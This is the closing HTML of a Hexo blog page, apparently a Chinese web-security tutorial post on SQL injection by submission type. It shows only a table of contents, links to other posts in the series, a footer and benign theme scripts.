class="toc-text">POST请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cookie"><span class="toc-number">3.3.</span> <span class="toc-text">cookie</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#REQUEST%E8%AF%B7%E6%B1%82"><span class="toc-number">3.4.</span> <span class="toc-text">REQUEST请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SERVER"><span class="toc-number">3.5.</span> <span class="toc-text">$_SERVER</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSON%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86"><span class="toc-number">4.</span> <span class="toc-text">JSON注入相关知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JSON%E5%9F%BA%E7%A1%80"><span class="toc-number">4.1.</span> <span class="toc-text">JSON基础</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JSON%E6%B3%A8%E5%85%A5"><span class="toc-number">4.2.</span> <span class="toc-text">JSON注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">演示案例：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95"><span class="toc-number">5.1.</span> <span class="toc-text">参数字符型注入测试</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#less5"><span class="toc-number">5.1.1.</span> <span class="toc-text">less5</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#less6"><span class="toc-number">5.1.2.</span> <span class="toc-text">less6</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POST-%E6%95%B0%E6%8D%AE%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95"><span class="toc-number">5.2.</span> <span class="toc-text">POST 数据提交注入测试</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#less11"><span class="toc-number">5.2.1.</span> <span class="toc-text">less11</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#COOKIE-%E6%95%B0%E6%8D%AE%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95"><span class="toc-number">5.3.</span> <span class="toc-text">COOKIE 数据提交注入测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP-%E5%A4%B4%E9%83%A8%E5%8F%82%E6%95%B0%E6%95%B0%E6%8D%AE%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95"><span class="toc-number">5.4.</span> <span class="toc-text">HTTP 头部参数数据注入测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E5%90%88-sqlilabs-%E6%9C%AC%E5%9C%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E6%BC%94%E7%A4%BA"><span class="toc-number">5.5.</span> <span class="toc-text">配合 sqlilabs 本地数据库演示</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-4 i,
+        .toc-level-4 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2021/09/21/15WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOracle%E3%80%81MongoDB%E6%B3%A8%E5%85%A5/" title="上一篇: 15WEB漏洞--SQL注入之Oracle、MongoDB注入">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2021/09/21/13WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5/" title="下一篇: 13WEB漏洞--SQL注入之MYSQL注入">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/37WEB%E6%BC%8F%E6%B4%9E-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP/">37WEB漏洞-反序列化之PHP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/36WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/">36WEB漏洞-逻辑越权之验证码与Token及接口</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/35WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4/">35WEB漏洞-逻辑越权之找回机制及接口爆破</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/34WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%94%AF%E4%BB%98%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9%E5%AE%89%E5%85%A8/">34WEB漏洞-逻辑越权之支付数据篡改安全</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/33WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/">33WEB漏洞-逻辑越权之水平垂直越权全解</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/32WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/">32WEB漏洞-文件操作之文件下载读取全解</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/31WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/">31WEB漏洞-文件操作之文件包含漏洞全解</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/30WEB%E6%BC%8F%E6%B4%9E-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/">30WEB漏洞-RCE代码及命令执行漏洞全解</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/29WEB%E6%BC%8F%E6%B4%9E-CSRF%E5%8F%8ASSRF%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%AE%B2%E8%A7%A3/">29WEB漏洞-CSRF及SSRF漏洞案例讲解</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/28WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/">28WEB漏洞-XSS跨站之WAF绕过及安全修复</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/27WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E4%BB%A3%E7%A0%81%E5%8F%8Ahttponly%E7%BB%95%E8%BF%87/">27WEB漏洞-XSS跨站之代码及httponly绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/26WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E8%AE%A2%E5%8D%95%E5%8F%8AShell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80%E8%AE%B0/">26WEB漏洞-XSS跨站之订单及Shell箱子反杀记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/25WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E5%8E%9F%E7%90%86%E5%88%86%E7%B1%BB%E5%8F%8A%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/">25WEB漏洞-XSS跨站之原理分类及攻击手法</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/24WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/">24WEB漏洞-文件上传之WAF绕过及安全修复</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/23WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E7%BC%96%E8%BE%91%E5%99%A8%E5%AE%89%E5%85%A8/">23WEB漏洞-文件上传之解析漏洞编辑器安全</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/22WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/">22WEB漏洞-文件上传之内容逻辑数组绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/21WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%90%8E%E7%AB%AF%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/">21WEB漏洞--文件上传之后端黑白名单绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/20WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E5%8F%8A%E8%BF%87%E6%BB%A4%E6%96%B9%E5%BC%8F/">20WEB漏洞--文件上传之基础及过滤方式</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/19WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%B7%B1%E5%85%A5WAF%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/">19WEB漏洞--SQL注入之深入WAF注入绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/18WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%A0%86%E5%8F%A0%E5%8F%8AWAF%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5/">18WEB漏洞--SQL注入之堆叠及WAF绕过注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/17WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%BA%8C%E6%AC%A1%E3%80%81%E5%8A%A0%E8%A7%A3%E5%AF%86%E3%80%81DNS%E7%AD%89%E6%B3%A8%E5%85%A5/">17WEB漏洞--SQL注入之二次、加解密、DNS等注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/16WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%8F%8A%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/">16WEB漏洞--SQL注入之查询方式及报错盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/15WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOracle%E3%80%81MongoDB%E6%B3%A8%E5%85%A5/">15WEB漏洞--SQL注入之Oracle、MongoDB注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/14WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/">14WEB漏洞--SQL注入之类型及提交注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/13WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5/">13WEB漏洞--SQL注入之MYSQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/12WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/">12WEB漏洞--SQL注入之简要SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/11WEB%E6%BC%8F%E6%B4%9E-%E5%BF%85%E6%87%82%E7%9F%A5%E8%AF%86/">11WEB漏洞--必懂知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/10%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%B5%84%E4%BA%A7%E7%9B%91%E6%8E%A7%E6%8B%93%E5%B1%95/">10信息收集-资产监控拓展</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/09%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-APP%E5%8F%8A%E5%85%B6%E4%BB%96%E8%B5%84%E4%BA%A7%E7%AD%89/">09信息收集--APP及其他资产等</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/08%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%B6%E6%9E%84%EF%BC%8C%E6%90%AD%E5%BB%BA%EF%BC%8CWAF/">08信息收集--架构，搭建，WAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/07%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-CDN%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/">07信息收集--CDN绕过技术</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/06%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/">06基础入门--加密编码算法</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/05%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93/">05基础入门--系统及数据库</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/04%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-WEB%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/">04基础入门--WEB源码拓展</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/03%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/">03基础入门--搭建安全拓展</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/12/02%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/">02基础入门--数据包拓展</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/10/01%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/">01基础入门--概念名词</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2021 Al0nez
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 6;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        $("a[target=_blank]").removeAttr("target");
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
